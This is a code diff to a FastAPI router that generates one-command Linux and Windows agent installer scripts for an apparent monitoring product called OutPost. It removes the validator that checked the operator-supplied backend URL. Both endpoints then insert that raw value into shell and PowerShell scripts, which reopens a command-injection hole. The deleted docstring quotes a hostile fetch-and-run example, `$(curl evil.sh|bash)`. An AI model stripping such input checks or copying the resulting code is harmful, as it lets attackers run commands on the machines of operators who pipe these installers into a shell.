@@ -13,7 +13,6 @@ and its events land here attributed to that host.
 """
 
 import json
-import re
 from datetime import datetime, timezone
 
 from fastapi import APIRouter, HTTPException, Query, Request, Response
@@ -381,29 +380,13 @@ def get_local_monitor_status() -> dict:
 # 1-Click Bootstrap Agent Scripts & Containment Actions
 # ---------------------------------------------------------------------------
 
-_SAFE_BACKEND_URL = re.compile(r"^https?://[A-Za-z0-9.\[\]:-]+/?$")
-
-
-def _safe_backend_url(request: Request, backend_url: str) -> str:
-    """Validate the operator-supplied backend URL before it is interpolated
-    into generated shell/PowerShell installers — a hostile value like
-    `?backend_url=$(curl evil.sh|bash)#` must never reach a script that an
-    operator pipes into a shell."""
-    server = (backend_url or "").strip() or str(request.base_url).rstrip("/")
-    if not _SAFE_BACKEND_URL.match(server):
-        raise HTTPException(
-            status_code=422,
-            detail="backend_url must be a plain http(s) origin like https://outpost.example.com:8000",
-        )
-    return server.rstrip("/")
-
 
 @router.get("/agents/install.sh", response_class=PlainTextResponse)
 def get_agent_install_script(request: Request, backend_url: str = Query("")) -> Response:
     """Generate universal 1-command Linux / macOS collector bootstrap script."""
     from ..core import auth as auth_service
 
-    server = _safe_backend_url(request, backend_url)
+    server = backend_url.strip() or str(request.base_url).rstrip("/")
     token = auth_service.agent_token()
     script = f"""#!/usr/bin/env bash
 # OutPost Agent Universal Bootstrap Installer
@@ -438,7 +421,7 @@ def get_agent_install_ps1(request: Request, backend_url: str = Query("")) -> Res
     """Generate universal 1-command Windows PowerShell collector bootstrap script."""
     from ..core import auth as auth_service
 
-    server = _safe_backend_url(request, backend_url)
+    server = backend_url.strip() or str(request.base_url).rstrip("/")
     token = auth_service.agent_token()
     script = f"""# OutPost Agent Universal Bootstrap Installer (Windows PowerShell)
 # Server: {server}
